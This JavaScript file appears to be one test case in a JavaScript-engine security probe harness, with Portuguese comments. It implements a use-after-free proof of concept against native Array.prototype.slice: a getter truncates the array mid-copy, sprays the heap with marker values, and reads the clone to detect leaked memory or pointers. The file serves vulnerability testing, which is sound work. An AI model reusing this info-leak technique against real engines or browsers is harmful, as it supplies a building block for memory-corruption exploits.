export default {
    id:       'NATIVE_CALLBACK_MUTATION_UAF',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Abusa do Array.prototype.slice nativo C++. Um getter é instalado no meio ' +
        'do array. Durante a cópia em bloco (memcpy), o getter destrói a memória subjacente ' +
        '(Butterfly). Se o C++ não revalidar os ponteiros, copia o lixo da RAM para o novo array.',

    setup: function() {
        this.results = {};
        
        // Array de números decimais (Ocupa blocos exatos de 8 bytes no Butterfly)
        this.vulnArray = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66, 7.77, 8.88];

        const self = this;

        // A ARMADILHA: Escondemos uma bomba no índice 3
        Object.defineProperty(this.vulnArray, 3, {
            get: function() {
                // O GATILHO: O C++ C++ está a meio da clonagem do Array!
                // Destruímos o tamanho do array original para libertar o seu Butterfly (memória)
                this.length = 0;

                // Inundamos o C++ com números bizarros para tentar sobrepor a memória que acabou de ficar livre
                let trash = [];
                for(let i = 0; i < 200; i++) {
                    trash.push([0x1337, 0xBADF00D, 13.37]);
                }
                self.trash = trash; // Impede o Garbage Collector de limpar a inundação
                
                return 4.44; // Retornamos o valor falso para o C++ continuar
            }
        });
    },

    trigger: function() {
        try {
            // slice() vai tentar clonar o vulnArray.
            // Ao chegar ao índice 3, a bomba explode. Os índices 4, 5, 6 e 7 
            // vão ser copiados da memória recém-libertada/corrompida!
            this.results.leakedArray = Array.prototype.slice.call(this.vulnArray);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O tamanho do array clonado (deveria ser 8 se o C++ ignorou o free)
        s => s.results.leakedArray ? s.results.leakedArray.length : 0,
        
        // Probe 1: O Extrator de INFO LEAK
        s => {
            if (s.results.leakedArray && s.results.leakedArray.length > 5) {
                // Vamos tentar ler o índice 6. Se o C++ tiver lido memória corrompida,
                // em vez de 7.77 ou undefined, teremos um ponteiro bruto ou o nosso lixo (0x1337).
                let val = s.results.leakedArray[6];
                
                if (typeof val === 'number' && !isNaN(val) && val !== 7.77) {
                    return val; // Devolvemos o valor bruto para o Executor disparar o alarme!
                }
            }
            return 0; // Retorna 0 (Seguro/Baseline)
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.results = {};
        this.trash = null;
    }
};
